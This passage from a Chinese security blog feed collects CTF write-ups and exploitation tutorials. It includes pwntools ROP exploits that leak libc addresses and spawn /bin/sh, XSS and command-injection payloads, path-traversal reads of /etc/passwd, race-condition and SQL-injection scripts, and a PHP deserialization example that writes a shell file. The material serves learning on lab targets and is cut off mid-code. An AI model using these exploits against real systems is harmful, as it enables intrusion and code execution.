      <content type="text"><![CDATA[SUCTF-2016-pwn400-writeupIDA看，程序流程简单，有明显栈溢出漏洞。 无libc，无canary等保护。基本的思路如下： 构造ROP链 泄露system地址 往bss段写入/bin/sh 调用system 最后的exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *p = process("./simple")elf = ELF("./simple")offset = 40pop_rdi_ret_addr = 0x00000000004006c3pop_rsi_pop_r15_ret = 0x00000000004006c1start_addr = elf.symbols['_start']write_plt = elf.plt['write']read_plt = elf.plt['read']main_addr = elf.symbols['main']bss_addr = elf.bss() + 0x18def leak(address): log.info("leak address =&gt; &#123;&#125;".format(hex(address))) p.recvuntil('luck!\n') payload = 'a' * offset payload += p64(pop_rdi_ret_addr) payload += p64(1) payload += p64(pop_rsi_pop_r15_ret) payload += p64(address) payload += p64(1) payload += p64(write_plt) payload += p64(main_addr) p.sendline(payload) address = p.recv(8) return addressd = DynELF(leak,elf = elf)system_addr = d.lookup('system','libc')log.success("system address =&gt; &#123;&#125;".format(hex(system_addr)))payload = 'a' * offsetpayload += p64(start_addr)p.sendline(payload)p.recvuntil('luck!\n')payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(0)payload += p64(pop_rsi_pop_r15_ret)payload += p64(bss_addr)payload += p64(1)payload += p64(read_plt)payload += p64(main_addr)p.sendline(payload)payload = '/bin/sh\x00'p.send(payload)p.recvuntil('luck!\n')payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(bss_addr)payload += p64(system_addr)p.sendline(payload)p.interactive()]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ROP学习：64位栈溢出]]></title>
      <url>%2F2017%2F06%2F26%2FROP%E5%AD%A6%E4%B9%A0%EF%BC%9A64%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA%2F</url>
      <content type="text"><![CDATA[web狗的二进制之路。 环境准备c程序 test.c ：123456789101112#include&lt;stdio.h&gt;void func()&#123; char name[0x50]; read(0, name, 0x100); write(1, name, 0x100);&#125;int main()&#123; func(); return 0;&#125; 编译：1gcc test.c -o pwn -O0 -fno-stack-protector 选项 -O0 表示不进行任何优化， -fno-stack-protector表示无canary保护。 基础知识C语言调用机制使用了栈数据结构，先进后出。同时栈是由高地址向低地址增长。 在64位环境下，函数的调用所需要的参数是优先通过寄存器来进行的。寄存器的顺序如下：rdi,rsi,rdx,rcx,r8,r9。当一个函数有大于6个整形参数，则超出的部分会通过栈来传递，这个情况少见。 64位环境下，还有几个特殊的指针（寄存器）：rip、rbp和rsp。其中rip是指令指针，cpu会把rip指向的内容当作指令执行。rbp指向当前栈帧的底部。rsp指向当前栈帧的顶部。 ROP由于64位下，是优先通过寄存器来传参，所以不能像在32位环境下直接去布置栈上的数据来exp。这时需要用到ROP技术(Retrun-oriented Programmming)，从可执行文件或者库中提取部分代码片段来进行恶意利用。 比如我们想要传入一个参数，那这个参数需要被布置到寄存器rdi中，这时我们可以寻找诸如pop rdi;ret的代码片段，从而在执行完pop rdi后把栈上布置好的数据存放到寄存器rdi中后能够再次控制程序执行流（ret） 常见的寻找ROP的工具有很多，这里使用ROPgadget。以前面的例子为例。1ROPgadget --binary &quot;pwn&quot; --only &quot;pop|ret&quot; 分析我们的测试程序是123456789101112#include&lt;stdio.h&gt;void func()&#123; char name[0x50]; read(0, name, 0x100); write(1, name, 0x100);&#125;int main()&#123; func(); return 0;&#125; 有非常明显的栈溢出漏洞，read从标准输入流（0）读取0x100放到name里面，之后write从name中读取长度为0x100的字节输出到屏幕（1）。我们可以通过输入，从而去覆盖func（）的返回地址，从而劫持控制流。 为能找到溢出点，可以使用pattern.py来测试。12(venv) chybeta@ubuntu:~/pwn/test$ pattern 100Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A 接着利用gdb，在运行（r）后输入上述生成的字符串，此时gdb发生段错误。因为是在64位环境下，指针无法到达高地址，即不能超过0x00007fffffffffff，所以不能直接利用查看$eip的方法。但因为ret指令，相当于pop rsp，所以只要看一下rsp的值，就知道跳转的地址，从而知道溢出点。1234567gdb-peda$ x/gx $rsp0x7fffffffdc98: 0x3164413064413963.......(venv) chybeta@ubuntu:~/pwn/test$ pattern 0x3164413064413963Pattern 0x3164413064413963 first occurrence at position 88 in pattern. 所以，溢出点是88个字节。 提供libc环境准备用ldd命令可以看到pwn程序运行时使用的libc.so。1234(venv) chybeta@ubuntu:~/pwn/test$ ldd pwn linux-vdso.so.1 =&gt; (0x00007ffeb7d64000) libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb139e93000) /lib64/ld-linux-x86-64.so.2 (0x00005602037ac000) 将/lib/x86_64-linux-gnu/libc.so.6拷贝到当前目录下。1cp /lib/x86_64-linux-gnu/libc.so.6 libc.so 思路 提供了libc.so，可以计算出read函数与system函数和sh字符串的偏移量。 利用write函数泄露出read函数的地址，从而计算system函数和sh字符串的真实地址。 调用system函数，并传入参数，即sh字符串。 exp:接下去根据exp进行一下详细的讲解。12345678910from pwn import *p = process("./pwn")elf = ELF("./pwn")libc = ELF("libc.so") # 题目提供offset = 88 offset_read_system = libc.symbols["read"] - libc.symbols["system"]offset_read_binsh = libc.symbols["read"] - next(libc.search("/bin/sh\x00"))log.success("offset_read_system =&gt; &#123;&#125;".format(hex(offset_read_system)))log.success("offset_read_binsh =&gt; &#123;&#125;".format(hex(offset_read_binsh))) offset偏移由pattern.py和gdb计算得出。read与system地址和sh地址由提供的libc，结合pwntools得到。 12pop_rdi_ret_addr = 0x0000000000400623pop_rsi_pop_r15_addr = 0x0000000000400621 两个地址，由ROPgadget得到，用于参数的传递。 123456789payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(1)payload += p64(pop_rsi_pop_r15_addr)payload += p64(elf.got["read"])payload += p64(1) payload += p64(elf.plt['write'])payload += p64(elf.symbols['func'])p.send(payload) 利用write函数泄露read函数地址。&#39;a&#39;*offset后到溢出点return跳到执行pop rdi，此时栈顶的数据为1，pop完后1被保存在寄存器rdi中，作为write的第一个参数。之后返回（ret）跳转到执行pop rsi，此时栈顶的数据为read函数的plt表地址，pop完后，其地址被保存在rsi中，作为write的第二个参数。接下去要执行pop r15，没有什么用，所以我们随便写一个p64（1）进去。再接下去就是ret（返回）跳转到func函数，以便进行下一次利用。为什么我们没有设置write的第三个参数呢？？？ 见下文。 12p.recv(0x100)read_addr = u64(p.recv(8)) 前面发送payload后，先执行了正常的write函数流程，注意源程序中的write的第三个参数是0x100，所以需要先p.recv(0x100)，之后由于func的返回地址被覆盖了，程序流程会进入我们设置好的rop中。在rop链中，我们修改了write的前两个参数，此时write的函数调用如下：write(1,read_plt_addr,0x100)。我们的目的是获得read函数的地址，在64位环境下为8个字节，所以只需要截取write输出的前8个字节，即read_addr = u64（p.recv(8)）。 12345system_addr = read_addr - offset_read_systembinsh_addr = read_addr - offset_read_binshlog.success("read_addr =&gt; &#123;&#125; ".format(hex(read_addr)))log.success('system_addr =&gt; &#123;&#125;'.format(hex(system_addr)))log.success("binsh_addr =&gt; &#123;&#125;".format(hex(binsh_addr))) 获取了read函数地址后，就可以计算system（）函数和字符串sh的地址了 1234567payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(binsh_addr)payload += p64(system_addr)p.send(payload)p.interactive() 第一次rop结束后，我们让它ret到func函数，接下来构造新的rop。同样利用&#39;a&#39;*offset先溢出到return，通过pop rdi，将sh字符串的地址保存到寄存器rdi中，作为system（）函数的参数。之后是ret，直接返回到system（）函数的地址，从而成功getshell（） 附上完整的exp：123456789101112131415161718192021222324252627282930313233343536373839from pwn import *p = process("./pwn")elf = ELF("./pwn")libc = ELF("libc.so")offset = 88offset_read_system = libc.symbols["read"] - libc.symbols["system"]offset_read_binsh = libc.symbols["read"] - next(libc.search("/bin/sh\x00"))log.success("offset_read_system =&gt; &#123;&#125;".format(hex(offset_read_system)))log.success("offset_read_binsh =&gt; &#123;&#125;".format(hex(offset_read_binsh)))pop_rdi_ret_addr = 0x0000000000400623pop_rsi_pop_r15_addr = 0x0000000000400621payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(1)payload += p64(pop_rsi_pop_r15_addr)payload += p64(elf.got["read"])payload += p64(1)payload += p64(elf.plt['write'])payload += p64(elf.symbols['func'])p.send(payload)p.recv(0x100)read_addr = u64(p.recv(8))log.success("read_addr =&gt; &#123;&#125; ".format(hex(read_addr)))system_addr = read_addr - offset_read_systembinsh_addr = read_addr - offset_read_binshlog.success('system_addr =&gt; &#123;&#125;'.format(hex(system_addr)))log.success("binsh_addr =&gt; &#123;&#125;".format(hex(binsh_addr)))payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(binsh_addr)payload += p64(system_addr)p.send(payload)p.recv(0x100)p.interactive() 不提供libc若题目没有提供libc的话，需要利用pwntool中的DynELF来泄露地址。但有些地方需要注意，因为DynELF会一直循环地去泄露地址，所以栈可能会有不可控的情况。根据《借助DynELF实现无libc的漏洞利用小结》，可以在函数地址泄露完后，调用_start函数以恢复栈。但我这里测试时，如果在泄露完成后再恢复就没办法pwn成功，我就直接把对_start的调用放到了leak函数里，每泄露一次就恢复一次栈。 思路 利用DynELF泄露出system的地址， 利用read函数向可写数据段（比如.bss段）写入字符串“/bin/sh” 调用system，getshell。 exp下面也是根据exp具体讲解。 1234from pwn import *p = process("./pwn")elf = ELF("./pwn")offset = 88 注意这里，我们已经没有用到libc.so了，手里有的只有pwn这个程序。 1234bss_addr = elf.bss()start_addr = elf.symbols['_start']pop_rdi_ret_addr = 0x0000000000400623pop_rsi_pop_r15_addr = 0x0000000000400621 bss_addr是我们准备写入字符串的bss段地址。start_addr用于恢复栈。pop_rdi_ret_addr，pop_rsi_pop_r15_addr由ROPgadget得到。 1234567891011121314151617181920def leak(address): log.info('leak address =&gt; &#123;&#125; '.format(hex(address))) payload = 'a' * offset payload += p64(pop_rdi_ret_addr) payload += p64(1) payload += p64(pop_rsi_pop_r15_addr) payload += p64(address) payload += p64(1) payload += p64(elf.plt['write']) payload += p64(elf.symbols['func']) p.send(payload) p.recv(0x100) address = p.recv(8) p.recv() payload = 'a' * offset payload += p64(start_addr) p.send(payload) p.recv(0x100) return address 利用rop技术，结合write（）函数，泄露出地址后又回到func函数体中。注意泄露的地址是8个字节，所以address = p.recv(8)，而write的第三个参数（0x100）我们没法改变，所以需要用p.recv()接收剩下的字符。接下去就是回到func函数后，会去调用_start函数，恢复栈。完了后再次进入func（），进行下一次泄露。 123456d = DynELF(leak, elf = ELF('./pwn'))system_addr = d.lookup("system","libc")read_addr = d.lookup("read","libc")# read_addr = elf.plt['read']log.success("system address =&gt; &#123;&#125;".format(hex(system_addr)))log.success("read address =&gt; &#123;&#125;".format(hex(read_addr))) 利用DynELF泄露出system和read函数的地址。read函数的地址，其实可以直接获得，即注释中的read_addr = elf.plt[&#39;read&#39;] 12345678910111213payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(0)payload += p64(pop_rsi_pop_r15_addr)payload += p64(bss_addr)payload += p64(1)payload += p64(read_addr)payload += p64(elf.symbols['func'])p.send(payload)p.recv(0x100)payload = '/bin/sh\x00'p.send(payload) 这一部分，调用read函数，向bss段写入/bin/sh字符串，之后再回到func函数体中。通过pop_rdi_ret_addr构造了read的第一个参数是0，通过pop_rsi_pop_r15_addr构造了read的第二个参数为bss_addr。接下去的那个p64(1)只是为了执行pop_r15没有其他用处。因此在调用read（）时是这样的：read(0,bss_addr,0x100)。 12345678payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(bss_addr)payload += p64(system_addr)p.send(payload)p.recv(0x100)p.interactive() 这一部分，调用system（），利用pop_rdi_ret_addr提供参数/bin/sh 附上完整exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *p = process("./pwn")elf = ELF("./pwn")offset = 88bss_addr = elf.bss()start_addr = elf.symbols['_start']pop_rdi_ret_addr = 0x0000000000400623pop_rsi_pop_r15_addr = 0x0000000000400621def leak(address): log.info('leak address =&gt; &#123;&#125; '.format(hex(address))) payload = 'a' * offset payload += p64(pop_rdi_ret_addr) payload += p64(1) payload += p64(pop_rsi_pop_r15_addr) payload += p64(address) payload += p64(1) payload += p64(elf.plt['write']) payload += p64(elf.symbols['func']) p.send(payload) p.recv(0x100) address = p.recv(8) p.recv() payload = 'a' * offset payload += p64(start_addr) p.send(payload) p.recv(0x100) return addressd = DynELF(leak, elf = ELF('./pwn'))system_addr = d.lookup("system","libc")read_addr = d.lookup("read","libc")# read_addr = elf.plt['read']log.success("system address =&gt; &#123;&#125;".format(hex(system_addr)))log.success("read address =&gt; &#123;&#125;".format(hex(read_addr)))payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(0)payload += p64(pop_rsi_pop_r15_addr)payload += p64(bss_addr)payload += p64(1)payload += p64(read_addr)payload += p64(elf.symbols['func'])p.send(payload)p.recv(0x100)payload = '/bin/sh\x00'p.send(payload)payload = 'a' * offsetpayload += p64(pop_rdi_ret_addr)payload += p64(bss_addr)payload += p64(system_addr)p.send(payload)p.recv(0x100)p.interactive()]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[xss-quiz-writeup]]></title>
      <url>%2F2017%2F06%2F25%2Fxss-quiz-writeup%2F</url>
      <content type="text"><![CDATA[xss-quiz： http://xss-quiz.int21h.jp/ Stage 1payload:1&lt;script&gt;alert(document.domain)&lt;/script&gt; Stage 2http://xss-quiz.int21h.jp/stage2.php 尝试如下payload：1&lt;script&gt;alert(document.domain)&lt;/script&gt; 无反应，查看源代码： 需要闭合前面value的双引号，所以最后payload如下：1&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&quot; Stage 3http://xss-quiz.int21h.jp/stage-3.php 多了一个选择country的功能。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[GCTF-web-writeup]]></title>
      <url>%2F2017%2F06%2F19%2FGCTF-web-writeup%2F</url>
      <content type="text"><![CDATA[GCTF-web-writeup 热身题题目地址：http://218.2.197.232:18001/访问robots.txt。1http://218.2.197.232:18001/robots.txt 一个个访问过去：1http://218.2.197.232:18001/rob0t.php 得到flag：1GCTF&#123;ae609880185f1d75&#125; springcssspringcss-cve-2014-3625漏洞。github上有利用脚本:https://github.com/ilmila/springcss-cve-2014-3625/blob/master/stealfile.sh 。这里的payload1：1http://218.2.197.232:18015/spring-css/resources/file:/etc/passwd payload2：1http://218.2.197.232:18015/spring-css/resources/file:/etc/flag 最后flag：1GCTF&#123;db839442402f5874&#125; PHP序列化题目地址：http://218.2.197.232:18017/ 题目给了源码：1234567891011&lt;?php//error_reporting(E_ERROR &amp; ~E_NOTICE);ini_set('session.serialize_handler', 'php_serialize');header("content-type;text/html;charset=utf-8");session_start();if(isset($_GET['src']))&#123; $_SESSION['src'] = $_GET['src']; highlight_file(__FILE__); print_r($_SESSION['src']);&#125;?&gt; 里面提到了session.serialize_handler，想到wooyun上的文章《PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患》 条件竞争题目地址：http://218.2.197.242:18009/ 查看源代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phpheader("Content-type: text/html; charset=utf-8");session_start();$mysqli = new mysqli("localhost", "root", "", "gctf09");if ($mysqli-&gt;connect_errno) &#123; die("数据库连接错误，多次出现请联系管理员。");&#125;//打印源码if(isset($_REQUEST['showcode']))&#123; highlight_file(___FILE___); exit();&#125;$user="";// 初次访问生成用户if(!isset($_SESSION["name"]))&#123; $user=substr(md5(uniqid().uniqid()),8,16); $_SESSION["name"]=$user; $stmt = $mysqli-&gt;prepare("INSERT INTO gctf09.`user` (name,pass) VALUES (?,?)"); $stmt-&gt;bind_param("ss",$user,md5($user)); $stmt-&gt;execute(); $stmt-&gt;close(); $stmt = $mysqli-&gt;prepare("INSERT INTO gctf09.`priv` (name,notadmin) VALUES (?,TRUE)"); $stmt-&gt;bind_param("s",$user); $stmt-&gt;execute(); $stmt-&gt;close();&#125;else&#123; $user=$_SESSION["name"];&#125;//重置时清理用户信息if($_SERVER["REQUEST_METHOD"] === "POST" &amp;&amp; $_GET['method']==="reset" &amp;&amp; isset($_POST['password']) )&#123; $stmt = $mysqli-&gt;prepare("DELETE FROM gctf09.`user` where name=?"); $stmt-&gt;bind_param("s",$user); $stmt-&gt;execute(); $stmt = $mysqli-&gt;prepare("DELETE FROM gctf09.`priv` where name=?"); $stmt-&gt;bind_param("s",$user); $stmt-&gt;execute(); $stmt = $mysqli-&gt;prepare("INSERT INTO gctf09.`user` (name,pass) VALUES (?,?)"); $stmt-&gt;bind_param("ss",$user,md5($_POST['password'])); $stmt-&gt;execute(); $stmt-&gt;close(); //判断用户权限时会查询priv表，如果为不为TRUE则是管理员权限 $stmt = $mysqli-&gt;prepare("INSERT INTO gctf09.`priv` (name,notadmin) VALUES (?,TRUE)"); $stmt-&gt;bind_param("s",$user); $stmt-&gt;execute(); $stmt-&gt;close(); $mysqli-&gt;close(); die("修改成功");&#125;$mysqli-&gt;close();?&gt; 初次访问生成用户时，会往user表和priv表写入数据。 而在重置用户时，进行了三个大的操作： 删除user表中对应数据，删除priv表中对应的值。 向user表中插入name和新的pass，达到更新密码的目的。 向priv表中对应的name下notadmin的值更改（即插入）为”TRUE”。 给出的源码中有一段注释：1//判断用户权限时会查询priv表，如果为不为TRUE则是管理员权限 所以在执行操作3之前，在这一个空隙里登陆的话，此时会是管理员权限。可以自己写多线程脚本，也可以用burp跑。 reset.py1234567import requestswhile True : parm = &#123;'name':'ea2a431e12ec99f7','password':'1111'&#125; cookies = &#123;'PHPSESSID':'p5gjc6u92u7vc3ugrjnnl86j61'&#125; r = requests.post('http://218.2.197.242:18009/index.php?method=reset',cookies=cookies,data=parm) print r.text login.py1234567891011import requestsflag = Falsewhile not flag: parm = &#123;'name':'ea2a431e12ec99f7','password':'1111'&#125; cookies = &#123;'PHPSESSID':'p5gjc6u92u7vc3ugrjnnl86j61'&#125; r = requests.post('http://218.2.197.242:18009/login.php?method=login',cookies=cookies,data=parm) print r.text if '&#123;' in r.text: flag = True break 两者分别运行。 最后flag：1GCTF&#123;KBnLGG6qR2ZdYe4HbUL8XpAP&#125; 读文件题目地址：http://218.2.197.232:18008/访问后查看源代码，如下： 若访问：1http://218.2.197.232:18008/a/down.php?p=1.txt 同样可以正常读取，可以猜测过滤了关键字：./ 若将1.txt改为flag.php，访问：12http://218.2.197.232:18008/a/down.php?p=./flag.php 则返回页面提示 waf，所以flag被waf了。 结合flag和./，同时我们知道flag在根目录下，而down在文件夹a下，应该要往回访问。构造下述链接：1http://218.2.197.232:18008/a/down.php?p=...//fl./ag.php ...//fl./ag.php中，./被过滤后会变成../flag.php，这样就能成功读取了。 最后flag：1GCTF&#123;drthSDFSDGFSdsfhfg&#125; RCE绕过题目地址：http://218.2.197.232:18006/有点类似“春秋杯”的web。构造如下payload：12http://218.2.197.232:18006/?cmd=%0acat%09 Forbidden题目地址：http://218.2.197.232:18002/ 访问得到forbidden，但返回头为200，所以是个人为写的页面。查看源代码下拉得到提示：1&lt;!--只允许本机访问。 --&gt; 在请求包中添加：1X-Forwarded-For:localhost 得到下一个提示：1&lt;!--只能通过域名访问 --&gt; 在请求包中继续添加：1Host:www.topsec.com 得到下一个提示：1&lt;!--只允许从百度跳转到本页面访问。 --&gt; 在请求包中继续添加：1Referer:www.baidu.com 得到下一个提示：1&lt;!--只允许使用ajax访问本页面 --&gt; 在请求包中继续添加：1X-Requested-With:XMLHttpRequest 得到下一个提示：1&lt;!--本站只允许使用IE4访问 --&gt; 在网上查一查，将userAgent修改如下：1User-Agent: Mozilla/4.0 (compatible; MSIE 4.0; Windows 98) 得到下一个提示：1&lt;!--电脑上必须安装有.NET8 --&gt; 修改userAgent如下1User-Agent: Mozilla/4.0 (compatible; MSIE 4.0; Windows 98;.NET CLR 8.0.50727) 得到下一个提示：1&lt;!--本站只允许德国用户访问。 --&gt; 修改userAgent如下：1Accept-Language: de-DE 得到下一个提示；1&lt;!--没有登录！ --&gt; 同时返回头中出现了：1Set-Cookie: login=4e6a59324d545a6a4e7a4d324e513d3d 探索如下：12344e6a59324d545a6a4e7a4d324e513d3d是十六进制编码，解码得到： NjY2MTZjNzM2NQ== 猜测是base64加密，解码得到： 66616c7365 猜测是十六进制编码，解码得到： false 要成功登陆，则login=true123true 进行十六进制编码，得到：74727565再base64编码，得到：NzQ3Mjc1NjU=再十六进制编码，得到：4e7a51334d6a63314e6a553d 在请求包中增加Cookie：1Cookie:login=4e7a51334d6a63314e6a553d 得到flag：1GCTF&#123;Dt24FbREwYJu7P8ekQHEFknK&#125; 越权注入题目地址：http://218.2.197.232:18014/ 查看源代码，得到提示，同时可以知道uid默认为500 ： 抓包改包，试着添加uid参数。 发现可以成功直接修改uid参数： 接下来考虑role参数，如果直接添加role参数： 会被拦截： 考虑进行注入。经过一番测试，可以知道，如果参数中带有引号，会被拦截，被提示说“未通过mysql_escape_string检查。” 若在uid后面加上一个括号，会出现sql报错： 猜测为update型注入，因为引号被过滤了，所以对admin进行一次hex编码，payload如下：1.....birth=11111111&amp;gender=&amp;uid=0,role=0x61646d696e 得到flag：1GCTF&#123;9CtyJLHMxkjLUs6qfUM5Cmrb&#125; web综合题目地址：http://218.2.197.232:18007/ 变态验证码题目地址： http://218.2.197.232:18003/ Java序列化题目地址： http://218.2.197.232:18005/ctfobj/]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[“春秋杯”web-writeup]]></title>
      <url>%2F2017%2F06%2F18%2F%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup%2F</url>
      <content type="text"><![CDATA[朋友打比赛，向她（对，女字旁的她）要的web题地址。 WEB-01访问，有一张图片。 查看源代码，发现提示有flag.php。访问后为空白页面。1&lt;img src=&quot;1.jpg&quot; alt=&quot;ͼƬ&quot; /&gt;&lt;!-- flag.php --&gt; 用御剑可以扫出备份文件index.php~，得到源代码如下：12345678910&lt;?php $a=$_GET["file"]; if(!isset($a)) &#123; $a='config'; &#125; @include($a.'.php');echo '&lt;img src="'.$img.'" alt="ͼƬ" /&gt;';?&gt; 参数为file，尝试利用php伪协议去读取flag.php。最后payload：1http://XXXXX/index.php?file=php://filter/read=convert.base64-encode/resource=flag 得到1PD9waHANCiRmbGFnPSdmbGFnezM4Y2FjMGU0OTc0ZTBlOTc2MTQ5MDhmOTAxZTQ1ZmUzfSc7DQo/Pg== base64-decode得到最后flag:123&lt;?php$flag='flag&#123;38cac0e4974e0e97614908f901e45fe3&#125;';?&gt; WEB-02上御剑扫描。发现敏感文件robots.txt。12345User-agent: *Disallow:Disallow: /imagesDisallow: /jsDisallow: /css 在js目录下有flag.txt 访问：1flag&#123;89a7f0eb82a314e5745ec9bc556d06c5&#125; WEB-03题目给了源码1234567891011121314151617181920&lt;?phpif(isset($_REQUEST[ 'ip' ])) &#123; $target = trim($_REQUEST[ 'ip' ]); $substitutions = array( '&amp;' =&gt; '', ';' =&gt; '', '|' =&gt; '', '-' =&gt; '', '$' =&gt; '', '(' =&gt; '', ')' =&gt; '', '`' =&gt; '', '||' =&gt; '', ); $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); $cmd = shell_exec( 'ping -c 4 ' . $target ); echo $target; echo "&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;";&#125;show_source(__FILE__); 拿DVWA代码改的，简直无力吐槽。 payload1：1http://XXXX:83/index.php?ip=127.0.0.1%0als paylaod2:1http://XXXX:83/index.php?ip=127.0.0.1%0acat flag.php WEB-04题目给了源码：123456789&lt;?phpif( isset( $_REQUEST['ip']) ) &#123; $target = $_REQUEST[ 'ip' ]; $cmd = shell_exec( 'ping -c 4 ' . $target ); echo "&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;";&#125;show_source(__FILE__);?&gt; 没任何过滤，payload1：1http://XXXX:84/index.php?ip=127.0.0.2 | ls payload2：1http://XXXX:84/index.php?ip=127.0.0.1 | cat flag.php flag:1flag&#123;19b55155-f84c-47ef-aeaa-038116de31e5&#125; 小扯两句好吧，这web题的质量，不敢恭维。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[浅谈php反序列化漏洞]]></title>
      <url>%2F2017%2F06%2F17%2F%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
      <content type="text"><![CDATA[php反序列化漏洞，又叫php对象注入漏洞。 序列化与反序列化php中有两个函数serialize() 和unserialize()。 serialize()当在php中创建了一个对象后，可以通过serialize()把这个对象转变成一个字符串，保存对象的值方便之后的传递与使用。测试代码如下；123456789&lt;?phpclass chybeta&#123; var $test = '123';&#125;$class1 = new chybeta;$class1_ser = serialize($class1);print_r($class1_ser);?&gt; 这边我们创建了一个新的对象，并且将其序列化后的结果打印出来：1O:7:&quot;chybeta&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;123&quot;;&#125; 这里的O代表存储的是对象（object）,假如你给serialize()传入的是一个数组，那它会变成字母a。7表示对象的名称有7个字符。&quot;chybeta&quot;表示对象的名称。1表示有一个值。{s:4:&quot;test&quot;;s:3:&quot;123&quot;;}中，s表示字符串，4表示该字符串的长度，&quot;test&quot;为字符串的名称，之后的类似。 unserialize()与 serialize() 对应的，unserialize()可以从已存储的表示中创建PHP的值，单就本次所关心的环境而言，可以从序列化后的结果中恢复对象（object）。123456789101112&lt;?phpclass chybeta&#123; var $test = '123';&#125;$class2 = 'O:7:"chybeta":1:&#123;s:4:"test";s:3:"123";&#125;'; print_r($class2);echo "&lt;/br&gt;";$class2_unser = unserialize($class2);print_r($class2_ser);?&gt; 这里提醒一下，当使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数。 反序列化漏洞由前面可以看出，当传给 unserialize() 的参数可控时，我们可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。 利用构造函数等Magic functionphp中有一类特殊的方法叫“Magic function”， 这里我们着重关注一下几个： 构造函数__construct()：当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。 析构函数__destruct()：当对象被销毁时会自动调用。 __wakeup() ：如前所提，unserialize()时会自动调用。 测试如下：12345678910111213141516171819202122232425&lt;?phpclass chybeta&#123; var $test = '123'; function __wakeup()&#123; echo "__wakeup"; echo "&lt;/br&gt;"; &#125; function __construct()&#123; echo "__construct"; echo "&lt;/br&gt;"; &#125; function __destruct()&#123; echo "__destruct"; echo "&lt;/br&gt;"; &#125;&#125;$class2 = 'O:7:"chybeta":1:&#123;s:4:"test";s:3:"123";&#125;'; print_r($class2);echo "&lt;/br&gt;";$class2_unser = unserialize($class2);print_r($class2_unser);echo "&lt;/br&gt;";?&gt; 利用场景__wakeup() 或__destruct()由前可以看到，unserialize()后会导致__wakeup() 或__destruct()的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在__wakeup() 或__destruct()中，从而当我们控制序列化字符串时可以去直接触发它们。这里针对 __wakeup() 场景做个实验。假设index源码如下：123456789101112131415161718&lt;?phpclass chybeta&#123; var $test = '123'; function __wakeup()&#123; $fp = fopen("shell.php","w") ; fwrite($fp,$this-&gt;test); fclose($fp); &#125;&#125;$class3 = $_GET['test'];print_r($class3);echo "&lt;/br&gt;";$class3_unser = unserialize($class3);require "shell.php";// 为显示效果，把这个shell.php包含进来?&gt; 同目录下有个空的shell.php文件。一开始访问index.php。 基本的思路是，本地搭建好环境，通过 serialize() 得到我们要的序列化字符串，之后再传进去。通过源代码知，把对象中的test值赋为 “&lt;?php phpinfo(); ?&gt;”,再调用unserialize()时会通过__wakeup()把test的写入到shell.php中。为此我们写个php脚本：123456789101112&lt;?phpclass chybeta&#123; var $test = '123'; function __wakeup()&#123; $fp = fopen("shell.php","w") ; fwrite($fp,$this-&gt;test); fclose($fp); &#125;&#125;$class4 = new chybeta();$class4-&gt;test = "&lt;?php phpinfo(); ?&gt;"; $class4_ser = serialize($class4); print_r($class4_ser);?&gt; 由此得到序列化结果：1O:7:&quot;chybeta&quot;:1:&#123;s:4:&quot;test&quot;;s:19:&quot;&lt;?php phpinfo(); ?&gt;&quot;;&#125; 其他Magic function的利用但如果一次unserialize()中并不会直接调用的魔术函数，比如前面提到的__construct()，是不是就没有利用价值呢？非也。类似于PWN中的ROP，有时候反序列化一个对象时，由它调用的__wakeup()中又去调用了其他的对象，由此可以溯源而上，利用一次次的“gadget”找到漏洞点。123456789101112131415161718192021222324&lt;?phpclass ph0en1x&#123; function __construct($test)&#123; $fp = fopen("shell.php","w") ; fwrite($fp,$test); fclose($fp); &#125;&#125;class chybeta&#123; var $test = '123'; function __wakeup()&#123; $obj = new ph0en1x($this-&gt;test); &#125;&#125;$class5 = $_GET['test'];print_r($class5);echo "&lt;/br&gt;";$class5_unser = unserialize($class5);require "shell.php";?&gt; 这里我们给test传入构造好的序列化字符串后，进行反序列化时自动调用 __wakeup()函数，从而在new ph0en1x()会自动调用对象ph0en1x中的__construct()方法，从而把&lt;?php phpinfo() ?&gt;写入到 shell.php中。 利用普通成员方法前面谈到的利用都是基于“自动调用”的magic function。但当漏洞/危险代码存在类的普通方法中，就不能指望通过“自动调用”来达到目的了。这时的利用方法如下，寻找相同的函数名，把敏感函数和类联系在一起。12345678910111213141516171819202122232425262728293031&lt;?phpclass chybeta &#123; var $test; function __construct() &#123; $this-&gt;test = new ph0en1x(); &#125; function __destruct() &#123; $this-&gt;test-&gt;action(); &#125;&#125;class ph0en1x 